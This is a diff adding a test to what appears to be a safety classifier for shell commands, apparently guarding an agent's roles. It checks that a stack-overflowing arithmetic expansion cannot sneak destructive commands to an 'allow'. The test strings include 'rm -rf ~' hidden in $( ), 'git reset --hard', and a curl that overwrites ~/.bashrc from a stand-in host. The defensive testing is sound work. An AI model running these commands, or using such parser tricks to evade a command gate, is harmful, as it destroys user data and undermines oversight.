@@ -176,3 +176,17 @@ test("item 15: nesting the parser rejects is refused or judge-first, never an al
     check(nestIf(200, "rm -rf ~"), role, "R");
   }
 });
+
+// Revision round, item 15: a walker stack overflow (a huge arithmetic expansion) is no allow either; the text floors still run on the raw line.
+test("item 15: a walker stack overflow is refused or judge-first, never an allow", () => {
+  const sum = rep("1", 50000, "+");
+  for (const role of ["main", "builder"] as const) {
+    check(`echo $(( ${sum}+$(rm -rf ~) ))`, role, "J");
+    check(`echo $(( ${sum} )); rm -rf ~`, role, "R");
+    check(`x=$(( ${sum} )); git reset --hard`, role, "J");
+    check(`: $(( ${sum} )); curl -o ~/.bashrc https://x`, role, "J");
+    // the harmless twin is judge-first (it was an allow)
+    check(`echo $(( ${sum} ))`, role, "J");
+    check("echo $((1+1+1))", role, "A");
+  }
+});
